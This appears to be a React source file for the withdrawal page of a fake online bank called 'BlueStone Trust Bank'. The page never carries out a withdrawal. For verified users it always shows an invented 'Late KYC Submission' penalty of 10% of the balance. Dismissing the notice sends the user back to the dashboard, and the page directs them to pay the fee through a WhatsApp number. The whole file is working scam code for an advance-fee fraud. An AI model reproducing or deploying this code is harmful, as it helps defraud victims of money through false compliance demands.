"use client"

import { useState, useEffect, useRef } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import {
  ChevronLeft, CheckCircle, AlertTriangle, Lock,
  ArrowDownToLine, DollarSign, User, Hash,
  ShieldAlert, X, Clock, FileWarning, BadgePercent,
} from "lucide-react"
import { useApp } from "@/lib/store"

const METHODS = [
  { id: "bank",   label: "Bank Transfer",  icon: "🏦", fee: "1%",   minAmount: 50, processingTime: "1-3 business days" },
  { id: "paypal", label: "PayPal",         icon: "🅿️", fee: "2%",   minAmount: 20, processingTime: "Instant" },
  { id: "crypto", label: "Cryptocurrency", icon: "₿",  fee: "0.5%", minAmount: 30, processingTime: "10-30 min" },
]

const WHATSAPP_NUMBER = "16722814398"
const WHATSAPP_HREF   = `https://wa.me/${WHATSAPP_NUMBER}`

// ─── WhatsApp SVG ─────────────────────────────────────────────────────────────

function WhatsAppIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
    </svg>
  )
}

// ─── Late KYC Penalty Modal ───────────────────────────────────────────────────

function LatePenaltyModal({
  balance,
  onDismiss,
}: {
  balance: number
  onDismiss: () => void
}) {
  const penaltyFee  = +(balance * 0.10).toFixed(2)
  const refId       = useRef("WD-" + Math.random().toString(36).toUpperCase().slice(2, 11))

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center p-0 sm:p-4">
      {/* Backdrop — clicking redirects to dashboard */}
      <div
        className="absolute inset-0 bg-black/70 backdrop-blur-sm animate-fade-in"
        onClick={onDismiss}
      />

      {/* Sheet / Modal */}
      <div className="relative w-full sm:max-w-md bg-white sm:rounded-3xl rounded-t-3xl shadow-2xl overflow-hidden animate-scale-in max-h-[92vh] flex flex-col">

        {/* Header stripe */}
        <div className="bg-gradient-to-r from-[#7c2d12] to-[#b91c1c] px-5 py-3.5 flex items-center gap-3 shrink-0">
          <ShieldAlert size={18} className="text-red-200 shrink-0" />
          <div className="flex-1">
            <p className="text-white text-xs font-bold tracking-widest uppercase">
              Withdrawal Blocked
            </p>
            <p className="text-red-200 text-[10px] mt-0.5">Compliance Notice · {refId.current}</p>
          </div>
          {/* X — redirects to dashboard */}
          <button
            onClick={onDismiss}
            className="w-7 h-7 flex items-center justify-center rounded-full bg-white/20 text-white hover:bg-white/30 transition-colors shrink-0"
          >
            <X size={14} />
          </button>
        </div>

        {/* Scrollable body */}
        <div className="overflow-y-auto flex-1 p-5 space-y-4">

          {/* Icon + title */}
          <div className="flex flex-col items-center pt-2 pb-1">
            <div className="relative mb-4">
              <div className="w-16 h-16 rounded-2xl bg-amber-50 border-2 border-amber-200 flex items-center justify-center">
                <Clock size={30} className="text-amber-500" />
              </div>
              <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-red-500 rounded-full flex items-center justify-center">
                <FileWarning size={13} className="text-white" />
              </div>
            </div>
            <h2 className="text-[#0c2d4e] font-bold text-lg tracking-tight text-center">
              Late KYC Submission Fee Required
            </h2>
            <p className="text-[#94a3b8] text-xs text-center mt-1 max-w-xs">
              Your KYC documents were validated but submitted outside the required
              <strong className="text-[#64748b]"> 30-minute activation window</strong>.
            </p>
          </div>

          {/* Explanation card */}
          <div className="bg-[#fff7ed] border border-amber-200 rounded-2xl p-4 space-y-2.5">
            <div className="flex items-start gap-2.5">
              <BadgePercent size={16} className="text-amber-500 shrink-0 mt-0.5" />
              <div>
                <p className="text-xs font-bold text-[#92400e]">10% Late Compliance Penalty</p>
                <p className="text-xs text-[#78350f] leading-relaxed mt-0.5">
                  In accordance with BlueStone Trust Bank compliance regulations, accounts with
                  KYC documents submitted after the 30-minute onboarding window are subject
                  to a <strong>10% late activation fee</strong> before withdrawal rights
                  can be reinstated.
                </p>
              </div>
            </div>
          </div>

          {/* Fee breakdown */}
          <div className="bg-[#f8fafc] border border-[#e2e8f0] rounded-2xl p-4 space-y-2">
            <p className="text-xs font-bold text-[#0c2d4e] uppercase tracking-wide mb-1">
              Penalty Breakdown
            </p>
            {[
              ["Account Balance",       `$${balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}`],
              ["Late Submission Rate",  "10%"],
              ["Penalty Fee Due",       `$${penaltyFee.toLocaleString("en-US", { minimumFractionDigits: 2 })}`],
            ].map(([label, value], i) => (
              <div
                key={label}
                className={`flex justify-between text-sm ${
                  i === 2
                    ? "border-t border-[#e2e8f0] pt-2 mt-1"
                    : ""
                }`}
              >
                <span className="text-[#64748b]">{label}</span>
                <span className={`font-bold ${i === 2 ? "text-red-600" : "text-[#0c2d4e]"}`}>
                  {value}
                </span>
              </div>
            ))}
          </div>

          {/* What happens next */}
          <div className="space-y-2.5">
            <p className="text-xs font-bold text-[#0c2d4e] uppercase tracking-wide">
              How to Reinstate Withdrawal Access
            </p>
            {[
              {
                step: "01",
                color: "bg-[#e8f4fd] text-[#1a6fad]",
                title: "Contact Compliance Support",
                desc:  "Reach our 24/7 team via WhatsApp to open a penalty resolution case.",
              },
              {
                step: "02",
                color: "bg-amber-50 text-amber-600",
                title: "Pay Late Activation Fee",
                desc:  `Settle the $${penaltyFee.toFixed(2)} penalty to clear your compliance hold.`,
              },
              {
                step: "03",
                color: "bg-[#f0fdf9] text-[#0e9483]",
                title: "Withdrawal Unlocked",
                desc:  "Full withdrawal access reinstated within 15 minutes of payment confirmation.",
              },
            ].map(({ step, color, title, desc }) => (
              <div key={step} className="flex items-start gap-3">
                <div className={`w-8 h-8 rounded-xl flex items-center justify-center shrink-0 font-bold text-xs ${color}`}>
                  {step}
                </div>
                <div>
                  <p className="text-xs font-bold text-[#0c2d4e]">{title}</p>
                  <p className="text-xs text-[#94a3b8] leading-relaxed">{desc}</p>
                </div>
              </div>
            ))}
          </div>

          {/* Security badge */}
          <div className="bg-[#f0fdf9] border border-[#bbf7d0] rounded-xl px-4 py-2.5 flex items-center gap-2">
            <CheckCircle size={14} className="text-[#0e9483] shrink-0" />
            <p className="text-xs text-[#065f46] leading-relaxed">
              <strong>Secure & Confidential.</strong> All compliance transactions are
              encrypted and processed under BlueStone Trust Bank regulatory standards.
            </p>
          </div>
        </div>

        {/* Sticky CTA footer */}
        <div className="p-4 border-t border-[#f1f5f9] bg-white shrink-0 space-y-2">
          <a
            href={WHATSAPP_HREF}
            target="_blank"
            rel="noopener noreferrer"
            className="w-full flex items-center justify-center gap-2.5 bg-[#25d366] hover:bg-[#1ebe5d] active:scale-[0.97] text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-md hover:shadow-lg"
          >
            <WhatsAppIcon className="w-4 h-4" />
            Resolve with Support on WhatsApp
          </a>
          <p className="text-center text-[10px] text-[#94a3b8]">
            BlueStone Trust Bank · Compliance Dept · 24/7 Support
          </p>
        </div>
      </div>
    </div>
  )
}

// ─── Main Page ────────────────────────────────────────────────────────────────

type Step = "amount" | "review"

export default function WithdrawPage() {
  const { currentUser } = useApp()
  const router = useRouter()
  const isVerified = currentUser?.verificationStatus === "verified"

  const [step,          setStep]          = useState<Step>("amount")
  const [method,        setMethod]        = useState(METHODS[0])
  const [amount,        setAmount]        = useState("")
  const [accountName,   setAccountName]   = useState("")
  const [accountNumber, setAccountNumber] = useState("")
  const [amountError,   setAmountError]   = useState("")
  const [showModal,     setShowModal]     = useState(false)

  // Show penalty modal immediately for verified users on page load
  useEffect(() => {
    if (isVerified) setShowModal(true)
  }, [isVerified])

  const handleReview = () => {
    if (!amount || numAmount < method.minAmount) {
      setAmountError(`Minimum withdrawal is $${method.minAmount}`)
      return
    }
    if (numAmount > (currentUser?.balance ?? 0)) {
      setAmountError("Insufficient balance.")
      return
    }
    setAmountError("")
    setStep("review")
  }

  // Intercept confirm — always show penalty modal
  const handleConfirm = () => setShowModal(true)

  // Dismissing always redirects to dashboard
  const handleDismiss = () => router.replace("/dashboard")

  const numAmount  = parseFloat(amount) || 0
  const feePct     = parseFloat(method.fee) / 100
  const charge     = numAmount * feePct
  const youReceive = numAmount - charge

  // ── Unverified: require KYC first ──────────────────────────────────────────
  if (!isVerified) {
    return (
      <div className="max-w-lg mx-auto animate-fade-in-up">
        <div className="flex items-center gap-3 mb-6">
          <Link href="/dashboard" className="w-9 h-9 flex items-center justify-center bg-white border border-[#e2e8f0] rounded-xl text-[#64748b] hover:text-[#0c2d4e] transition-all">
            <ChevronLeft size={18} />
          </Link>
          <h1 className="text-xl font-bold text-[#0c2d4e] tracking-tight">Withdraw Funds</h1>
        </div>

        <div className="bg-white border border-[#e2e8f0] rounded-2xl p-8 text-center shadow-sm">
          <div className="w-16 h-16 bg-red-50 rounded-2xl flex items-center justify-center mx-auto mb-4">
            <Lock size={28} className="text-red-500" />
          </div>
          <h2 className="text-lg font-bold text-[#0c2d4e] mb-2 tracking-tight">Verification Required</h2>
          <p className="text-sm text-[#64748b] mb-6 leading-relaxed">
            Withdrawals are only available to <strong>verified</strong> account holders.
            Complete your KYC to unlock this feature.
          </p>

          {currentUser?.kycSubmitted ? (
            <div className="bg-red-50 border border-red-200 rounded-xl p-4 text-sm text-red-700 mb-5 text-left">
              <p className="font-bold mb-1">Unable to verify account</p>
              <p className="text-xs leading-relaxed">
                Your submitted documents could not be verified. Please contact our support team for assistance.
              </p>
            </div>
          ) : (
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-3.5 text-xs text-amber-700 mb-5 text-left flex gap-2">
              <AlertTriangle size={13} className="shrink-0 mt-0.5" />
              Submit your KYC documents to unlock withdrawals.
            </div>
          )}

          <div className="space-y-2.5">
            <Link href="/dashboard/kyc" className="w-full flex items-center justify-center gap-2 bg-[#0c2d4e] hover:bg-[#1a4a72] text-white font-bold py-3.5 rounded-xl text-sm transition-all hover:shadow-lg btn-press">
              {currentUser?.kycSubmitted ? "View Verification Status" : "Start KYC Verification"}
            </Link>
            <div className="grid grid-cols-2 gap-2">
              <a href={WHATSAPP_HREF} target="_blank" rel="noopener noreferrer"
                className="flex items-center justify-center gap-1.5 border border-green-300 bg-green-50 text-green-700 py-2.5 rounded-xl text-xs font-bold hover:bg-green-100 transition-colors">
                WhatsApp Support
              </a>
              <a href="mailto:info@bluestonetrustbank.com"
                className="flex items-center justify-center gap-1.5 border border-[#e2e8f0] text-[#64748b] py-2.5 rounded-xl text-xs font-bold hover:bg-[#f8fafc] transition-colors">
                Email Support
              </a>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // ── Verified: show form + penalty modal ────────────────────────────────────
  return (
    <>
      {showModal && (
        <LatePenaltyModal
          balance={currentUser?.balance ?? 0}
          onDismiss={handleDismiss}
        />
      )}

      <div className="max-w-lg mx-auto pb-4 animate-fade-in-up">
        <div className="flex items-center gap-3 mb-6">
          {step === "review" ? (
            <button onClick={() => setStep("amount")} className="w-9 h-9 flex items-center justify-center bg-white border border-[#e2e8f0] rounded-xl text-[#64748b] hover:text-[#0c2d4e] transition-all">
              <ChevronLeft size={18} />
            </button>
          ) : (
            <Link href="/dashboard" className="w-9 h-9 flex items-center justify-center bg-white border border-[#e2e8f0] rounded-xl text-[#64748b] hover:text-[#0c2d4e] transition-all">
              <ChevronLeft size={18} />
            </Link>
          )}
          <div>
            <h1 className="text-xl font-bold text-[#0c2d4e] tracking-tight">Withdraw Funds</h1>
            <p className="text-xs text-[#64748b]">
              Available: <strong className="text-[#0c2d4e]">${currentUser?.balance.toFixed(2)}</strong>
            </p>
          </div>
        </div>

        {step === "amount" && (
          <div className="bg-white border border-[#e2e8f0] rounded-2xl p-6 space-y-5 shadow-sm">
            {/* Balance */}
            <div className="balance-card rounded-xl p-4 text-white">
              <p className="text-white/60 text-xs mb-1">Available Balance</p>
              <p className="text-2xl font-bold">
                ${currentUser?.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}
              </p>
            </div>

            {/* Method */}
            <div>
              <label className="block text-sm font-semibold text-[#334155] mb-2">Withdrawal Method</label>
              <div className="space-y-2">
                {METHODS.map((m) => (
                  <button key={m.id} onClick={() => setMethod(m)}
                    className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl border-2 text-sm transition-all ${method.id === m.id ? "border-[#1a6fad] bg-[#e8f4fd]" : "border-[#e2e8f0] hover:border-[#c4d4e0]"}`}>
                    <span className="text-xl">{m.icon}</span>
                    <div className="flex-1 text-left">
                      <p className="font-bold text-[#0c2d4e] text-sm">{m.label}</p>
                      <p className="text-xs text-[#94a3b8]">Fee: {m.fee} · {m.processingTime}</p>
                    </div>
                    {method.id === m.id && <CheckCircle size={16} className="text-[#1a6fad] shrink-0" />}
                  </button>
                ))}
              </div>
            </div>

            {/* Fields */}
            {[
              { label: "Account Holder Name", val: accountName, set: setAccountName, icon: User, ph: "Your full name" },
              {
                label: method.id === "crypto" ? "Wallet Address" : "Account / Routing Number",
                val: accountNumber, set: setAccountNumber, icon: Hash,
                ph: method.id === "crypto" ? "0x..." : "Account number",
              },
            ].map(({ label, val, set: s, icon: Icon, ph }) => (
              <div key={label}>
                <label className="block text-sm font-semibold text-[#334155] mb-1.5">
                  {label} <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <Icon size={15} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#94a3b8]" />
                  <input value={val} onChange={(e) => s(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 border border-[#e2e8f0] rounded-xl text-sm outline-none focus:border-[#1a6fad] focus:ring-2 focus:ring-[#1a6fad]/20 transition-all placeholder:text-[#c4d4e0]"
                    placeholder={ph} />
                </div>
              </div>
            ))}

            {/* Amount */}
            <div>
              <label className="block text-sm font-semibold text-[#334155] mb-1.5">
                Amount (USD) <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <DollarSign size={15} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#94a3b8]" />
                <input type="number" value={amount}
                  onChange={(e) => { setAmount(e.target.value); setAmountError("") }}
                  className={`w-full pl-10 pr-16 py-3 border rounded-xl text-sm outline-none transition-all placeholder:text-[#c4d4e0] ${amountError ? "border-red-400 bg-red-50" : "border-[#e2e8f0] focus:border-[#1a6fad] focus:ring-2 focus:ring-[#1a6fad]/20"}`}
                  placeholder={`Min. $${method.minAmount}`} />
                <span className="absolute right-4 top-1/2 -translate-y-1/2 text-[#94a3b8] text-xs font-bold">USD</span>
              </div>
              {amountError && <p className="text-xs text-red-500 mt-1">{amountError}</p>}
            </div>

            {/* Preview */}
            {numAmount > 0 && (
              <div className="bg-[#f4f7fb] rounded-xl p-4 space-y-2">
                {[["Withdrawal Amount", `$${numAmount.toFixed(2)}`], [`Fee (${method.fee})`, `-$${charge.toFixed(2)}`]].map(([l, v]) => (
                  <div key={l} className="flex justify-between text-sm">
                    <span className="text-[#64748b]">{l}</span>
                    <span className="font-medium text-[#0c2d4e]">{v}</span>
                  </div>
                ))}
                <div className="flex justify-between text-sm border-t border-[#e2e8f0] pt-2">
                  <span className="font-bold text-[#0c2d4e]">You Receive</span>
                  <span className="font-bold text-[#0e9483]">${youReceive.toFixed(2)}</span>
                </div>
              </div>
            )}

            <button onClick={handleReview}
              className="w-full flex items-center justify-center gap-2 bg-[#0c2d4e] hover:bg-[#1a4a72] text-white font-bold py-3.5 rounded-xl transition-all text-sm hover:shadow-lg btn-press">
              <ArrowDownToLine size={16} /> Review Withdrawal
            </button>
          </div>
        )}

        {step === "review" && (
          <div className="space-y-4 animate-fade-in-up">
            <div className="bg-white border border-[#e2e8f0] rounded-2xl p-6 shadow-sm">
              <h2 className="font-bold text-[#0c2d4e] mb-4 tracking-tight">Withdrawal Summary</h2>
              <div className="space-y-0">
                {[
                  ["Method",          method.label],
                  ["Account Name",    accountName || "—"],
                  ["Account Number",  accountNumber || "—"],
                  ["Amount",          `$${numAmount.toFixed(2)}`],
                  ["Fee",             `$${charge.toFixed(2)}`],
                  ["You Receive",     `$${youReceive.toFixed(2)}`],
                  ["Processing Time", method.processingTime],
                ].map(([l, v]) => (
                  <div key={l} className="flex justify-between py-2.5 border-b border-[#f8fafc] last:border-0">
                    <span className="text-sm text-[#64748b]">{l}</span>
                    <span className={`text-sm font-bold ${l === "You Receive" ? "text-[#0e9483]" : "text-[#0c2d4e]"}`}>{v}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-amber-50 border border-amber-200 rounded-xl p-3.5 flex gap-2 text-xs text-amber-700">
              <AlertTriangle size={13} className="shrink-0 mt-0.5" />
              Ensure your account details are correct. Withdrawals cannot be reversed once processed.
            </div>

            <button onClick={handleConfirm}
              className="w-full flex items-center justify-center gap-2 bg-gradient-to-r from-[#0e9483] to-[#0a7a6d] hover:opacity-90 text-white font-bold py-3.5 rounded-xl transition-all text-sm hover:shadow-lg btn-press">
              <CheckCircle size={16} /> Confirm Withdrawal
            </button>
          </div>
        )}
      </div>
    </>
  )
}
